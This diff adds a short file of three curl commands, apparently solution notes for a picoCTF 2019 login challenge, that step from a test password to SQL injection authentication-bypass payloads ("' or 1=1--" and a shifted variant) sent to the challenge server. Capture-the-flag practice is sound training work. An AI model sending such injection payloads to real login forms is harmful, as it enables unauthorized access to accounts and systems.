@@ -1,0 +1,5 @@
+curl "https://2019shell1.picoctf.com/problem/40742/login.php" --data "password=test&debug=1"
+↓
+curl "https://2019shell1.picoctf.com/problem/40742/login.php" --data "password=' or 1=1--&debug=1"
+↓
+curl "https://2019shell1.picoctf.com/problem/40742/login.php" --data "password=' be 1=1--&debug=1" && echo
